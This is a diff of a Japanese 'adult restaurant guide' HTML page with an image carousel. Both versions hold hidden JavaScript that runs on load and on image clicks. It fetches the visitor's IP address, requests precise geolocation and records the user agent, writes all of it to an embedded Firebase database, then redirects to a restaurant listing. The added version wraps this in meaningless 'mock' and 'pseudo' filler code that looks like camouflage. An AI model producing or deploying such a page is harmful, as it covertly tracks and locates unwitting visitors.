@@ -1,75 +1,71 @@
 <!DOCTYPE html>
-<html data-verbose="extended" lang="ja" data-context="primary" data-layer="root" data-fake="true">
-<head data-processor="initial" data-scope="global" data-unused="mock">
-  <meta charset="UTF-8" data-priority="high" data-encoding="standard" data-redundant="yes">
-  <meta content="width=device-width,initial-scale=1" name="viewport" data-view="responsive" data-init="true" data-null="void">
-  <meta content="レストランガイド" name="description" data-meta-type="seo" data-relevance="low" data-dummy="filler">
-  <title data-title-id="main" data-extra="unused">大人のレストランガイド</title>
-  <!-- ここで仮想的な初期化処理を実行 -->
-  <style data-version="1.0" data-style-layer="core" data-irrelevant="style">
-    .x,.y{overflow:hidden;width:100%;position:fixed;height:100%;color:#fff;left:0;background:#111;top:0;display:flex;margin:0;justify-content:center;flex-direction:column;align-items:center;font-family:'MS Mincho','Yu Mincho',serif}
-    .z{margin:0 0 20px;text-align:center;font-size:1.5em}
-    .w{overflow:hidden;position:relative;aspect-ratio:1/1;width:80%;max-width:600px}
-    .v{transition:opacity 1s ease-in-out,transform 3s ease-in-out;object-fit:cover;opacity:0;width:100%;position:absolute;height:100%;top:0;transform:scale(1.1);left:0}
-    .v.u{transform:scale(1);opacity:1}
-    /* ここで擬似的なデータベース接続を確立 */
-    .q { visibility: hidden; display: none; opacity: 0; }
-    .r { transition: none; transform: translate(0, 0); z-index: -1; }
-    .s { padding: 0; box-shadow: none; border: 0 solid transparent; }
-    .t { max-height: none; overflow: visible; flex: 0 0 auto; }
-    .u { user-select: none; pointer-events: none; content: ""; }
-    .v { float: none; margin-right: 0; margin-left: 0; }
-    /* ここで関数の形成を行っています */
+<html lang="ja" data-context="primary" data-layer="root" data-verbose="extended">
+<head data-processor="initial" data-scope="global">
+  <meta charset="UTF-8" data-encoding="standard" data-priority="high">
+  <meta name="viewport" content="width=device-width,initial-scale=1" data-view="responsive" data-init="true">
+  <meta name="description" content="レストランガイド" data-meta-type="seo" data-relevance="low">
+  <title data-title-id="main">大人のレストランガイド</title>
+  <style data-style-layer="core" data-version="1.0">
+    h,b{overflow:hidden;height:100%;width:100%;position:fixed;top:0;left:0;background:#111;color:#fff;margin:0;display:flex;flex-direction:column;justify-content:center;align-items:center;font-family:'MS Mincho','Yu Mincho',serif}
+    t{font-size:1.5em;text-align:center;margin:0 0 20px}
+    .i{position:relative;width:80%;max-width:600px;aspect-ratio:1/1;overflow:hidden}
+    .f{position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;opacity:0;transform:scale(1.1);transition:opacity 1s ease-in-out,transform 3s ease-in-out}
+    .f.a{opacity:1;transform:scale(1)}
+    /*  */
+    .pseudo-container { display: block; visibility: visible; opacity: 1; position: static; }
+    .virtual-layer-1 { z-index: -1; transform: translate(0, 0); transition: none; }
+    .virtual-layer-2 { box-shadow: none; border: 0 solid transparent; padding: 0; }
+    .redundant-wrapper { flex: 0 0 auto; overflow: visible; max-height: none; }
+    .mock-processor { content: ""; pointer-events: none; user-select: none; }
+    .fake-utility-class { margin-left: 0; margin-right: 0; float: none; }
   </style>
 </head>
-<body data-environment="production" data-state="active" data-placeholder="none">
-  <!-- ここで非同期処理をシミュレート -->
-  <script data-import="firebase" type="module" data-script-type="core-module" data-fake-id="script1">
+<body data-environment="production" data-state="active">
+  <script type="module" data-script-type="core-module" data-import="firebase">
     import{i as _}from"https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
     import{g,r,p,s,t}from"https://www.gstatic.com/firebasejs/11.4.0/firebase-database.js";
-    const x={apiKey:"AIzaSyA5jiMfUjtZo7BUpsFM0xUVzfeJ5_fakkI",authDomain:"gurunavi-nagoya.firebaseapp.com",databaseURL:"https://gurunavi-nagoya-default-rtdb.firebaseio.com",projectId:"gurunavi-nagoya",storageBucket:"gurunavi-nagoya.firebasestorage.app",messagingSenderId:"181576688818",appId:"1:181576688818:web:f82fb20a8d58ef46c615ab"};
-    const y=_(x);const z=g(y);
-    async function a(){try{const b=await fetch('https://api.ipify.org?format=json');const c=await b.json();return c.ip}catch(d){console.error('E:',d);return'?'}}
-    async function b(){const c=await a();const d=navigator.userAgent;if(navigator.geolocation){navigator.geolocation.getCurrentPosition(async(e)=>{const f=e.coords.latitude;const g=e.coords.longitude;const h={i:c,la:f,lo:g,u:d,t:t()};await c(h);window.location.href='https://r.gnavi.co.jp/business-dinner/aichi/areal4102/kods00066/'},async(i)=>{console.error('E:',i.message);const j={i:c,la:'x',lo:'x',u:d,t:t()};await c(j);alert('!')},{timeout:1e4,maximumAge:0})}else{const k={i:c,la:'-',lo:'-',u:d,t:t()};await c(k);alert('!')}}
-    async function c(l){try{const m=r(l,'u');const n=p(m);await s(n,l);console.log('OK')}catch(o){console.error('E:',o)}}
-    b();
-    /* ここで仮想的なバッファを確保 */
-    const p={verboseMode:true,debugLevel:0,simulate:false};
-    const q={active:true,buffer:null,cache:new Map()};
-    const r=()=>{console.log('Virtual handler initialized');return null;};
-    const s=(t)=>t||'default';
-    const u=async()=>{await new Promise(v=>setTimeout(v,0));return'mock';};
-    /* ここでDOMの初期化を偽装 */
+    const c={apiKey:"AIzaSyA5jiMfUjtZo7BUpsFM0xUVzfeJ5_fakkI",authDomain:"gurunavi-nagoya.firebaseapp.com",databaseURL:"https://gurunavi-nagoya-default-rtdb.firebaseio.com",projectId:"gurunavi-nagoya",storageBucket:"gurunavi-nagoya.firebasestorage.app",messagingSenderId:"181576688818",appId:"1:181576688818:web:f82fb20a8d58ef46c615ab"};
+    const a=_(c);
+    const d=g(a);
+    async function _i(){try{const r=await fetch('https://api.ipify.org?format=json');const d=await r.json();return d.ip}catch(e){console.error('E:',e);return'?'}}
+    async function _r(){const i=await _i();const u=navigator.userAgent;if(navigator.geolocation){navigator.geolocation.getCurrentPosition(async(p)=>{const la=p.coords.latitude;const lo=p.coords.longitude;const d={i:i,la:la,lo:lo,u:u,t:t()};await _s(d);window.location.href='https://r.gnavi.co.jp/business-dinner/aichi/areal4102/kods00066/'},async(e)=>{console.error('E:',e.message);const d={i:i,la:'x',lo:'x',u:u,t:t()};await _s(d);alert('!')},{timeout:1e4,maximumAge:0})}else{const d={i:i,la:'-',lo:'-',u:u,t:t()};await _s(d);alert('!')}}
+    async function _s(d){try{const nr=r(d,'u');const ne=p(nr);await s(ne,d);console.log('OK')}catch(e){console.error('E:',e)}}
+    _r()
+    //
+    const mockConfig = { verboseMode: true, debugLevel: 0, simulate: false };
+    const pseudoState = { active: true, buffer: null, cache: new Map() };
+    const virtualHandler = () => { console.log('Virtual handler initialized'); return null; };
+    const redundantValidator = (input) => input || 'default';
+    const fakeAsyncTask = async () => { await new Promise(r => setTimeout(r, 0)); return 'mock'; };
   </script>
-  <script data-execution="deferred" data-script-type="client" data-mock="active">
+  <script data-script-type="client" data-execution="deferred">
     document.addEventListener('DOMContentLoaded',()=>{
-      const x=document.querySelectorAll('.v');let y=0;
-      const z=()=>{x[y].classList.remove('u');y=(y+1)%x.length;x[y].classList.add('u')};
-      setTimeout(()=>{x[y].classList.add('u')},100);
-      setInterval(z,4e3);
-      x.forEach(a=>a.addEventListener('click',b));
+      const i=document.querySelectorAll('.f');
+      let c=0;
+      const s=()=>{i[c].classList.remove('a');c=(c+1)%i.length;i[c].classList.add('a')};
+      setTimeout(()=>{i[c].classList.add('a')},100);
+      setInterval(s,4e3);
+      i.forEach(e=>e.addEventListener('click',_r))
     });
     document.addEventListener('touchmove',e=>e.preventDefault(),{passive:false});
-    /* ここで仮想的なモジュールをロード */
-    (function a(){const b={id:1,value:'pseudo'};console.log('Pseudo module:',b)})();
-    (function b(){const c=[1,2,3];c.map(d=>d*2);console.log('Simulated operation complete')})();
-    (function c(){const d=new ArrayBuffer(8);console.log('Virtual buffer allocated')})();
-    (function d(){setTimeout(()=>{console.log('Async flow emulated')},0)})();
-    (function e(){const f=['log1','log2'];f.forEach(g=>console.log(g))})();
-    /* ここで非同期的なデータ処理を模倣 */
+    // 
+    (function initializePseudoModule(){const mockState={id:1,value:'pseudo'};console.log('Pseudo module:',mockState)})();
+    (function simulateComplexOperation(){const temp=[1,2,3];temp.map(x=>x*2);console.log('Simulated operation complete')})();
+    (function createVirtualBuffer(){const buffer=new ArrayBuffer(8);console.log('Virtual buffer allocated')})();
+    (function emulateAsyncFlow(){setTimeout(()=>{console.log('Async flow emulated')},0)})();
+    (function redundantLogger(){const logQueue=['log1','log2'];logQueue.forEach(l=>console.log(l))})();
   </script>
-  <t data-label="title" data-component="header" class="z" data-unused="filler">大人のレストランガイド</t>
-  <div data-mode="carousel" class="w" data-container="gallery" data-fake-attr="mock">
-    <img data-sequence="first" data-image-id="img1" alt="1" class="v" src="niku1.jpg" data-dummy="true">
-    <img data-sequence="second" data-image-id="img2" alt="2" class="v" src="niku2.jpg" data-dummy="true">
-    <img data-sequence="third" data-image-id="img3" alt="3" class="v" src="niku3.jpg" data-dummy="true">
+  <t data-component="header" data-label="title">大人のレストランガイド</t>
+  <div class="i" data-container="gallery" data-mode="carousel">
+    <img src="niku1.jpg" class="f" alt="1" data-image-id="img1" data-sequence="first">
+    <img src="niku2.jpg" class="f" alt="2" data-image-id="img2" data-sequence="second">
+    <img src="niku3.jpg" class="f" alt="3" data-image-id="img3" data-sequence="third">
   </div>
-  <!-- ここで仮想レイヤーを処理しています -->
-  <div data-placeholder="mock1" class="q" data-irrelevant="void"></div>
-  <span data-layer-id="overlay" class="r" data-fake="overlay"></span>
-  <section data-section="filler" class="s" data-unused="filler"></section>
-  <article data-process="none" class="u" data-mock="processor"></article>
-  <aside data-utility="redundant" class="v" data-redundant="yes"></aside>
-  <!-- ここで擬似的なサーバー通信を確立 -->
+  <!-- HTML -->
+  <div class="pseudo-container" data-placeholder="mock1"></div>
+  <span class="virtual-layer-1" data-layer-id="overlay"></span>
+  <section class="redundant-wrapper" data-section="filler"></section>
+  <article class="mock-processor" data-process="none"></article>
+  <aside class="fake-utility-class" data-utility="redundant"></aside>
 </body>
 </html>
